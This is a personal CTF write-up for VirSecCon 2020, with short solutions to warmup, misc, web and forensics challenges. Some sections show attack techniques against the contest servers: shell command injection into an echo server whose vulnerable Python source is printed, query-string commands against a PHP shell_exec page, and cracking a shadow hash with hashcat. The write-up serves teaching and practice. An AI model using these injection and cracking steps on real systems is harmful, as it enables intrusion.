---
title: VirSecCon CTF
layout: post
category: writeup
toc_level: 2
---

#  VirSecCon 2020 CTF Write-Up
```
Nsbst
316th place
1175 points
```

## Challenges
### Warmup
- Read the Rules (5) :trophy:
- Believe Your Eyes (10) :trophy:
- Yarn (25) :trophy:
- Puppo (25) :trophy:
- DotCom Scavenger Hunt (25) :trophy:
- Ssh, quiet! (35) :trophy:
- Pack'd (40) :trophy:
- Capture the Flag (50) :x:

### Binary Exploitation
- Count Dracula (75) :x:
- TackStack (100) :x:
- John's Pickle Jar (125) :x:
- Buff The Barque (125) :x:
- Return Label (150) :x:
- Seed Spring (150) :x:
- Shopping List (250) :x:

### Scripting
- 2048 (75) :x:
- Quick Run (75) :x:
- Pincode (75) :x:
- Loopback (100) :x:
- 2xPAD (100) :x:
- Gammer (125) :x:
- CALC-UL8R (150) :x:
- Clockwork (150) :x:

### Miscellaneous
- Catalias (60) :trophy:
- Hidden (60) :trophy:
- Chasm (60) :trophy:
- Linux Kiosk (70) :trophy:
- MissingCho (80) :trophy:
- pdfmax (90) :x:
- Obfuscabyss (125) :x:
- Pyg-Pen (150) :x:

### Web
- Countdown (60) :trophy:
- Hot Access (70) :x:
- Magician (80) :x:
- PHPJuggler (80) :x:
- GLHF (90) :x:
- JaWT (90) :x:
- MASK (90) :x:
- 10 Charachter Web Shell (100) :trophy:
- Sequelitis (100) :x:
- Dairy Products (100) :x:
- Irregular Expressions (100) :x:
- GET Encoded (125) :x:
- Eyeless (150) :x:

### Cryptography
- Chief Executive Officer (70) :x:
- Polybius (70) :x:
- Classic (80) :x:
- Hot Dog (100) :x:
- Old Monitor (135) :x:

### Forensics
- I Lost My Password! (75) :trophy:
- QUACK (80) :x:
- Tragic Number (95) :trophy:

### Steganography
- Stegosaurus (70) :x:
- Winter Wondrland (80) :x:
- WhitePages (80) :x:
- Elessbe (80) :x:

---

## Warmup

### Read the Rules (5) :trophy:
> Please follow the rules for this CTF!  Connect here: http://ctf.virseccon.com/rules.

Flag is commented out in the source of the rules page.

<br/>
:checkered_flag: `LLS{you_are_ready_to_HACK_THE_PLANET}`
<br/>
<br/>

### Believe Your Eyes (10) :trophy:
> You would not believe your eyes...

File `believe_your_eyes.rar` is a .png file.  
`cat` the file into `strings` and `grep` for the flag.

<br/>
:checkered_flag: `LLS{if_ten_million_fireflies}`
<br/>
<br/>

### Yarn (25) :trophy:
> I found this ball of... yarn?

File `yarn` is a large file of garbage data.  
Same as before, `cat` the file into `strings` and `grep` for the flag.  

<br/>
:checkered_flag: `LLS{it_was_just_a_ball_of_strings}`
<br/>
<br/>

### Puppo (25) :trophy:
> Awww, isn't this puppo so cute??? I can almost hear him barking... what does he say?

File `woofer.jpg` is provided.  
`file woofer.jpg` reveals a comment in the image:  
`comment: "b'TExTe2RvZ2dvX3NheXNfc3VjaF9iYXNlNjRfdmVyeV93b3d9'"`.  
<br/>
Appears to be base64. Decode it for the flag.  
```sh
echo 'TExTe2RvZ2dvX3NheXNfc3VjaF9iYXNlNjRfdmVyeV93b3d9' | base64 -d`
```

<br/>
:checkered_flag: `LLS{doggo_says_such_base64_very_wow}`
<br/>
<br/>

### DotCom Scavenger Hunt (25) :trophy:
> It’s a website scavenger hunt!

File `dotcom_scavenger_hunt.zip` unzips to a .com directory structure.  
<br/>
Recursively search through every file for the flag with `grep`.  
`grep -r './nothinginthebox.com' -e 'LLS'`  
<br/>
This could have been done more elegantly, but this gets us what we want; two files containing 'LLS'.  You can `grep` through each file seperately, or look through the output of the first command to find the flag.  

<br/>
:checkered_flag: `LLS{just_find_it_with_grep}`
<br/>
<br/>

### Ssh, quiet! (35) :trophy:
> Ssssh, don't wake the flag!  **(Yes, that is intended behavior.)**

We are give `ssh user@jh2i.com -p 50035 # password is 'userpass'` so let's connect.  
<br/>
We are immediately kicked out.  
```sh
ssh user@jh2i.com -p 50035
user@jh2i.com's password: 
Last login: Fri Apr  3 20:22:50 2020 from 167.172.141.127
Connection to jh2i.com closed.
```  
<br/>
We can run some commands directly from the ssh connection without getting a shell back.  
```
ssh user@jh2i.com -p 50035 ls
user@jh2i.com's password: 
flag.txt
```  
<br/>
There is the flag.  Let's grab it.  
```
ssh user@jh2i.com -p 50035 cat flag.txt
user@jh2i.com's password: 
LLS{automate_ssh_like_a_boss}
```  

<br/>
:checkered_flag: `LLS{automate_ssh_like_a_boss}`
<br/>
<br/>

### Pack'd (40) :trophy:
> I checked the mailbox, and I found this bundled up package! Can you make any sense of it?

We are given a file `packd`.  
```sh
file packd
packd: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header
```  
<br/>
Running the binary doesnt give us anything helpful.  
```sh
./packd
Oh! This package must have been shipped to the wrong address!%
```  
<br/>
Standard `grep` tells us where *part* of the flag is.  
```sh
cat packd | strings | grep -n LLS
2522:LLS{
```
<br/>
Let's narrow things down with `sed` and force `grep` to treat this binary as text with `-a`.  
```sh
sed '2520,2524p' packd | grep -a LLS      
��$�i�3tL��L���E���6��L>��#��_������@Oh! This ~���package mus�havbeen s����6pped toh&wrong address~ko�!HOMrsome6i._unnec}���0ary�LLS{�5an_ex��ݿ8utable_cbdw_da����*}C�ruli� Y��f�ou'v�▒�DO NOT LIW����IT�UAEAS
```  
<br/>
On those same lines I found  
```sh
Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved.
```  
This might come in handy.  
<br/>
I installed upx with `apt` and tried to unpack `packd` with `upx -d packd`  
```
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018
        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    657616 <-    276068   41.98%   linux/i386    packd
Unpacked 1 file.
```  
Success!  
<br/>
Let's try to search again
```sh
grep -a LLS < packd
Oh! This package must have been shipped to the wrong address!HOMEsomething_unnecessaryLLS{packing_an_executable_can_hide_some_data}Congratulations! You've won!DO NOT LIFT WITHOUT AT LEAST 2 PERSONSFragile: Please handle with care../csu/libc-start.ci686i586FATAL: kernel too old
```
<br/>
:checkered_flag: `LLS{packing_an_executable_can_hide_some_data}`
<br/>
<br/>

### Capture the Flag (50) :x:
> Are you ready to play Capture the Flag?  This is a stupid challenge, and it is dumb, and stupid.  https://www.youtube.com/watch?v=Nh23tQ8MD-Q

Uh.. what?

<br/>
<br/>

---

## Binary Exploitation

### Count Dracula (75) :x:
Integer overflow, IDK how to escelate this.

### TackStack (100) :x:

### John's Pickle Jar (125) :x:

### Buff The Barque (125) :x:

### Return Label (150) :x:

### Shopping List (250) :x:

---

### Scripting
- 2048 (75) :x:
- Quick Run (75) :x:
- Pincode (75) :x:
- Loopback (100) :x:
- 2xPAD (100) :x:
- Gammer (125) :x:
- CALC-UL8R (150) :x:
- Clockwork (150) :x:

---

## Miscellaneous

### Catalias (60) :trophy:
> Hmmm… maybe missing a hyphen somewhere?  Note: This challenge is reset every five minutes. If you are on the wrong side of the clock, you may need to reconnect.

We are given ssh creds `ssh user@jh2i.com -p 50004 # password is 'userpass'`  
<br/>
Initial recon shows the flag.txt  
```sh
user@a32e554fa667:~$ ls
flag.txt
user@a32e554fa667:~$ cat 
user@a32e554fa667:~$ cat flag.txt
```  
<br/>
We can't seem to `cat` as this user (no shit look at the challenge name).  Like the quiet shell challenge, we can run commands directly from the ssh command.  
```sh
ssh user@jh2i.com -p 50004 cat flag.txt
user@jh2i.com's password: 
LLS{you_let_the_cat_out_of_the_bag}
```  
<br/>
:checkered_flag: `LLS{you_let_the_cat_out_of_the_bag}`
<br/>
<br/>

### Hidden (60) :trophy:
> What secret is this server hiding?!

Another remote shell `ssh user@jh2i.com -p 50015 # password is 'userpass'`  

```sh
user@b833b58b377f:~$ ls -la
total 32
dr-xr-xr-x 1 user user 4096 Oct 28 19:13 .
drwxr-xr-x 1 root root 4096 Oct 28 19:13 ..
-rw-r--r-- 1 user user  220 Apr  4  2018 .bash_logout
-rwxr-xr-x 1 user user 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 user user  807 Apr  4  2018 .profile
drwxr-xr-x 1 root root 4096 Apr  3 19:52 .secret
```
<br/>
But the .secret dir is empty?
```sh
user@b833b58b377f:~/.secret$ ls -la
total 12
drwxr-xr-x 1 root root 4096 Apr  3 19:52 .
dr-xr-xr-x 1 user user 4096 Oct 28 19:13 ..
```
<br/>
Bashed my head against a wall for an hour and came back to this.
```sh
user@ebbb47e22daa:~$ ls -la .secret/
total 12
drwxr-xr-x 1 root root 4096 Mar 30 00:12 .
dr-xr-xr-x 1 user user 4096 Oct 28 19:13 ..
-rw-r--r-- 1 root root   33 Mar 30 00:12 ._dont_delete_me.txt
```
<br/>
People are dicks...
<br/>
:checkered_flag: `LLS{you_found_my_hidden_secrets}`
<br/>
<br/>

### Chasm (60) :trophy:
> The Internet’s new echo server. Break it.

We are given `nc jh2i.com 50006`
<br/>
Greeted with:
```sh
'Chasm' echo server 1.0
> echo
ECHO: echo
```
<br/>
This is something...
```sh
> $0
ECHO: /bin/sh
```
<br/>
```sh
> $(pwd) 
ECHO: /home/john
```
<br/>
```sh
> $(ls -a)
ECHO: . .. flag.txt server.py
```
<br/>
Damn...
```sh
> $(cat flag.txt)
HACKER! YOU ARE A HACKER! GET OUT OF THE CHASM!
```
<br/>
Let's check out that python file.
```sh
> $(cat server.py)
```
```python
#!/usr/bin/env python

#- * -coding: utf - 8 - * -#@Author: john# @Date: 2017 - 01 - 16 10: 17: 31# @Last Modified by: john# @Last Modified time: 2017 - 02 - 10 22: 17: 34
import sys
import textwrap
import SocketServer
import string
import readline
import threading from time
import flag.txt server.py from subprocess
import check_output
debug = True
if debug: def success(string): print("[+] " + string) def error(string): sys.stderr.write("[-] " + string + "
    ") def warning(string): print(" [!]
    " + string + "
    ") def info(string): print(" [.]
    " + string + "
    ") class Service(SocketServer.BaseRequestHandler): def handle(self): self.send("
    'Chasm'
    echo server 1.0 ") while 1: try: got = self.receive() if "
    flag " in got: self.send("
    HACKER!YOU ARE A HACKER!GET OUT OF THE CHASM!") continue response = check_output("
    echo " + got, shell=True) self.send("
    ECHO: " + response) except: self.send("
    ERROR!That echo floated away the chasm
    for eternity...") def send(self, string, newline=True): if newline: string = string + "
    " self.request.sendall(string) def receive(self, prompt=" > "): self.send(prompt, newline=False) return self.request.recv(4096).strip() class ThreadedService( SocketServer.ThreadingMixIn, SocketServer.TCPServer, SocketServer.DatagramRequestHandler, ): pass def main(): info("
    Starting server...") port = 7312 host = "
    0.0 .0 .0 " service = Service server = ThreadedService((host, port), service) server.allow_reuse_address = True server_thread = threading.Thread(target=server.serve_forever) server_thread.daemon = True server_thread.start() success("
    Server started on " + str(server.server_address) + "!") # Now let the main thread just wait... while True: sleep(10) if __name__ == "
    __main__ ": main()```
```
<br/>
So the server is killing our command execution if it reads the word 'flag'. Simple enough.
```sh
> $(cat fl?g.txt)
ECHO: LLS{dangerous_echos_in_this_chasm}
```
<br/>
:checkered_flag: `LLS{dangerous_echos_in_this_chasm}`
<br/>
<br/>

### Linux Kiosk (70) :trophy:
> This public computer kiosk is weird! It just offers the man page for less?

ssh again `ssh user@jh2i.com -p 50021 # password is 'userpass'`
<br/>
Just as the prompt suggests, we get the man page for less, and then we are kicked off when we quit out of man.
<br/>
I tried appending commands to the ssh, but the appended commands run before the man page, and the man page fills the terminal line buffer (terminology here?) so we can't see our commands output.
<br/>
Since `man` pages are shown in `less`, it makes sense to RTFM...  A shell escape stands out:
```sh
!command             Execute the shell command with $SHELL.
```
<br/>
:checkered_flag: `LLS{less_is_more}`
<br/>
<br/>

### MissingCho (80) :trophy:
> I keep trying to run this program, but I get "Permission Denied." What gives!??

Another ssh port `ssh user@jh2i.com -p 50025 # password is 'userpass'`
<br/>
Well it looks like I get a freebie on this one.
```sh
 ls -la
total 40
dr-xr-xr-x 1 user user 4096 Mar 30 00:12 .
drwxr-xr-x 1 root root 4096 Oct 28 19:10 ..
-rw-r--r-- 1 user user  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 user user 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 user user  807 Apr  4  2018 .profile
-rwxrwxr-x 1 root root 8232 Mar 30 00:12 give_flag
```
<br/>
I'm guessing the permission is not supposed to be executable right off the bat..
```sh
user@39dc7b8c3dec:~$ ./give_flag 
LLS{who_even_needs_chmod}
```
<br/>
The box was reset so I can walk through the intended solution.  Below is how the home dir is supposed to look.
```sh
user@3711c4232e47:~$ ls -la
total 32
dr-xr-xr-x 1 user user 4096 Mar 31 14:39 .
drwxr-xr-x 1 root root 4096 Oct 28 19:10 ..
-rw-r--r-- 1 user user  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 user user 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 user user  807 Apr  4  2018 .profile
-r--r--r-- 1 root root 8232 Mar 31 14:39 give_flag
```
<br/>
No `hexdump` or `xxd` or even `cat` on this box (likely blocked with alias), but `od` worked.  Looking through it manually revealed the flag
```sh
0002600 001  \0 002  \0   L   L   S   {   w   h   o   _   e   v   e   n
0002620   _   n   e   e   d   s   _   c   h   m   o   d   }  \0  \0  \0
```
<br/>
:checkered_flag: `LLS{who_even_needs_chmod}`
<br/>
<br/>

### pdfmax (90) :x:
> pdfmax version 1.0! The new online cloud interpreter. All a student could ever need!

Netcat again `nc jh2i.com 50029`
<br/>
We are greeted with:
```sh
pdfmax1.0) What would you like to do?
1) About pdfmax
2) Create
3) Compile
4) Download
>
```
<br/>
So I created a valid .tex file and hit the compile command and... Nothing.
<br/>
So we move on...
<br/>
<br/>

### Obfuscabyss (125) :x:
> Oops! I tripped and my flag fell down this abyss!

We are given `obfuscabyss.zip` which extracts to `brainfuck.txt`
<br/>
Looking at the file, this is obviously brainfuck code.  Let's grab an interpreter and jump down the rabbit hole.  
```sh
sudo apt install beef
```
<br/>
```sh
beef -o brainfuck.out brainfuck.txt
``` 
gives us a file with a bunch of punctuation marks.
<br/>
I am stuck from here, may revisit.

<br/>
<br/>

### Pyg-Pen (150) :x:
> Oh no! We are locked in a pyg-pen! Help us break out.

Another talkative port, this time on `jh2i.com 50032`
<br/>
Judging by the name of the challenge, I am guessing it is a python interpreter, but responses are non-elucidating (is that a word?)
```sh
> ls
Exception: name 'ls' is not defined
> !
Exception: invalid syntax (<string>, line 1)
> string
Exception: name 'string' is not defined
> print('hello world')
Exception: invalid syntax (<string>, line 1)
> $(SHELL)
```
<br/>
This is a different error at least
```sh
> os.system('ls -l')
Exception: EOL while scanning string literal (<string>, line 1)
```

<br/>
<br/>

---

## Web

### Countdown (60) :trophy:
> We hear something beeping... is there something in the oven?

We are told to conect to this address `http://jh2i.com:50036`.  
<br/>
This one has us looking at a static html page with alink to a `defuse.php` script.  
<br/>
Click it, we are told we are "too late".  
<br/>
If you look for cookies in the dev options pane you see defuse_time.  
<br/>
Set that to a a large number and see what happens.  
<br/>
:checkered_flag: `LLS{saving_lives_with_cookies}`
<br\>
<br\>

### Hot Access (70) :x:
> Access to all the latest modules, hot off the press! What can you access?

This is the address ` http://jh2i.com:50016`.
<br/>
<br/>

### Magician (80) :x:

### PHPJuggler (80) :x:

### GLHF (90) :x:

### JaWT (90) :x:

### MASK (90) :x:

### 10 Character Web Shell (100) :trophy:
> Only 10 char--

Navigate to a given address `http://jh2i.com:5000` and we are greeted with:
```php
<?php

    $c = $_GET[c];

    if(strlen($c) < 10){
            echo shell_exec($c);
    }else{
            echo "too long!";
    }
    highlight_file(__FILE__);
?>
```
<br/>
Looks like we get shell execution, as long as its under 10 chracters.  Let's try it.  
```
http://jh2i.com:50001/?c=ls%20fl*
```
```php
flag.txt
<?php

    $c = $_GET[c];

    if(strlen($c) < 10){
            echo shell_exec($c);
    }else{
            echo "too long!";
    }
    highlight_file(__FILE__);
?>
```
<br/>
As you can see we can cut down the input length of commands with wildcards.  Let's `cat` the flag and move on.
```
http://jh2i.com:50001/?c=cat%20*.txt
```
```php
LLS{you_really_can_see_in_the_dark}
<?php

    $c = $_GET[c];

    if(strlen($c) < 10){
            echo shell_exec($c);
    }else{
            echo "too long!";
    }
    highlight_file(__FILE__);
?>
```
<br/>
:checkered_flag: `LLS{you_really_can_see_in_the_dark}`
<br/>
<br/>
### Sequelitis (100) :x:

### Dairy Products (100) :x:

### Irregular Expressions (100) :x:

### GET Encoded (125) :x:

### Eyeless (150) :x:

### Meme Factory (200) :x:

<br/>
<br/>

---

## Cryptography

### Chief Executive Officer (70) :x:
> I found this weird file a bit ago... I've tried to operate with it but I can't seem to get it to work. I've tried the whole range of possibilities!

<br/>
<br/>

### Polybius (70) :x:
> Polybius is hosting a party, and you’re invited. He gave you his number; be there or be square!  **Note, this flag is not in the usual flag format.**

<br/>
<br/>

### Classic (80) :x:
> My friend told me this "was a classic", but these letters and numbers don't make any sense to me. I didn't know this would be a factor in our friendship!

<br/>
<br/>

### Hot Dog (100) :x:
> This isn't a problem with the grill.

<br/>
<br/>

### Old Monitor (135) :x:
> I have this old CRT monitor that I use for my desktop computer. It crashed on me and spit out all these weird numbers…

<br/>
<br/>

---

## Forensics

### I Lost My Password! (75) :trophy:
> Oh no! Can you please help me retrieve my password?  **To submit this flag, you must wrap the discovered password in the typical flag format.**

We are given a `passwd` and `shadow` file.  This should be straightforward with either John the Ripper or Hashcat. I will use Hashcat.
```sh
sudo apt install hashcat
```
<br/>
Run `clinfo` to make sure your preffered cracking device is able to run OpenCL.  
<br/>
Okay, grab the password hash from `shadow` and put it in its own file, `hash`.
```sh
grep john < shadow
john:$6$s.e1vJFx9a3RMVUM$etzkgAvXdiyR/5vBWFzC4J.ECadUJkDi6MUiOEJfc1mo3Z7VeWZKv1iWSvW8XQ8zC5bK8kTvWCs7iw5Hy3ve/0:18205:0:99999:7:::`
`echo '$6$s.e1vJFx9a3RMVUM$etzkgAvXdiyR/5vBWFzC4J.ECadUJkDi6MUiOEJfc1mo3Z7VeWZKv1iWSvW8XQ8zC5bK8kTvWCs7iw5Hy3ve/0' > hash
```
<br/>
Before we can crack it, we need to know what type of hash this is.  
`hashID` comes pre-installed on Kali, but can be installed on any system with `pip3 install hashid`.  
<br/>
The `-m` option will tell us what mode to use for the given hash in hashcat.
```sh
hashid -m < hash 
Analyzing '$6$s.e1vJFx9a3RMVUM$etzkgAvXdiyR/5vBWFzC4J.ECadUJkDi6MUiOEJfc1mo3Z7VeWZKv1iWSvW8XQ8zC5bK8kTvWCs7iw5Hy3ve/0'
[+] SHA-512 Crypt [Hashcat Mode: 1800]
```
<br/>
Let's try it.  I am using [this](https://github.com/berzerk0/Probable-Wordlists/blob/master/Real-Passwords/Top304Thousand-probable-v2.txt) wordlist.
```sh
hashcat --force --potfile-disable -a 0 -m 1800 -o hascat.out hash ~/Documents/wordlists/Top304Thousand-probable-v2.txt
```
<br/>
It was cracked even on my old laptop, must be a simple password.
```sh
Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$s.e1vJFx9a3RMVUM$etzkgAvXdiyR/5vBWFzC4J.ECadUJkD...y3ve/0
Time.Started.....: Fri Apr  3 19:39:26 2020 (40 secs)
Time.Estimated...: Fri Apr  3 19:40:06 2020 (0 secs)
Guess.Base.......: File (/home/noah/Documents/wordlists/Top304Thousand-probable-v2.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      598 H/s (10.31ms) @ Accel:128 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 23552/303872 (7.75%)
Rejected.........: 0/23552 (0.00%)
Restore.Point....: 23040/303872 (7.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#1....: kokanee -> scared
```
<br/>
The password is in the specified output file.
<br/>
:checkered_flag: `LSS{whiterose}`
<br/>
<br/>

### QUACK (80) :x:
> We found this binary on a USB drive someone left lying around. There was a note attached, that read: “you’re the one.”
<br/>
This one has me beat...

### Tragic Number (95) :trophy:
> For some reason this zip archive wont unzip. Help!

Running `file tragic_number.zip` returns: 
```sh
tragic_number.zip: Zip archive data, made by v?[0x31e], extract using at least v2.0, last modified Thu Oct 18 06:10:02 2012, uncompressed size 42, method=deflate
```
<br/>
Running `unzip -l tragic_number.zip` shows a `flag.txt` file in the zip.
```sh
Archive:  tragic_number.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       42  2020-03-31 19:41   flag.txt
---------                     -------
       42                     1 file
```
<br/>
```sh
unzip -v tragic_number.zip 
Archive:  tragic_number.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
      42  Defl:N       35  17% 2020-03-31 19:41 b6e50a2a  flag.txt
--------          -------  ---                            -------
      42               35  17%                            1 file
```
<br/>
Next attempt was a hexdump.
```sh
hexdump -C tragic_number.zip
00000000  48 34 43 4b 14 00 00 00  08 00 3a 9d 7f 50 2a 0a  |H4CK......:..P*.|
00000010  e5 b6 23 00 00 00 2a 00  00 00 08 00 1c 00 66 6c  |..#...*.......fl|
00000020  61 67 2e 74 78 74 55 54  09 00 03 40 d5 83 5e 40  |ag.txtUT...@..^@|
00000030  d5 83 5e 75 78 0b 00 01  04 e8 03 00 00 04 e8 03  |..^ux...........|
00000040  00 00 f3 f1 09 ae 2e 29  4a 4c cf 4c 8e cf 2b cd  |.......)JL.L..+.|
00000050  4d 4a 2d 8a cf cd 2f 4a  8d cf c9 cc 4e 8d cf 45  |MJ-.../J....N..E|
00000060  12 ae e5 02 00 50 4b 01  02 1e 03 14 00 00 00 08  |.....PK.........|
00000070  00 3a 9d 7f 50 2a 0a e5  b6 23 00 00 00 2a 00 00  |.:..P*...#...*..|
00000080  00 08 00 18 00 00 00 00  00 01 00 00 00 80 81 00  |................|
00000090  00 00 00 66 6c 61 67 2e  74 78 74 55 54 05 00 03  |...flag.txtUT...|
000000a0  40 d5 83 5e 75 78 0b 00  01 04 e8 03 00 00 04 e8  |@..^ux..........|
000000b0  03 00 00 50 4b 05 06 00  00 00 00 01 00 01 00 4e  |...PK..........N|
000000c0  00 00 00 65 00 00 00 00  00                       |...e.....|
000000c9
```
<br/>
Notice the first four bytes.  Some Googling reveals that magic bytes for a zip archiver should be `(0x50 0x4B 0x03 0x04)`.
<br/>
Time to pull out the hex editor...  
<br/>
Replacing 'H4CK' with the correct magic bytes allows us to unzip the archive and reveal the `flag.txt`.
```sh
unzip magic_number.zip 
Archive:  magic_number.zip
  inflating: flag.txt
```
<br/>
:checkered_flag: `LLS{tragic_number_more_like_magic_number}`
<br/>
<br/>

---

## Steganography

### Stegosaurus (70) :x:
> Scientists are struggling with a new mystery: we thought the dinosaurs were gone, but this one has returned! Hmmm... can you solve this mystery?

IDK man...

<br/>
<br/>

### Winter Wonderland (80) :x:
> It’s the holiday season! But hmm… they must be hiding something under all that cheer!

This might not be my strong suite...

<br/>
<br/>

### WhitePages (80) :x:
> I stopped using YellowPages and moved onto WhitePages… but the book they gave me is all blank!

This is getting harder...

<br/>
<br/>

### Elessbe (80) :x:
< Ah, bonjour mon bon ami! Bienvenue à la capture du drapeau! J’ai entendu dire que vous étiez fan de la stéganographie! Avez-vous déjà entendu parler d’un outil appelé zsteg?

More .png stego... 

Well I have these saved for another try in future anyway...

<br/>
<br/>

---

## **FIN**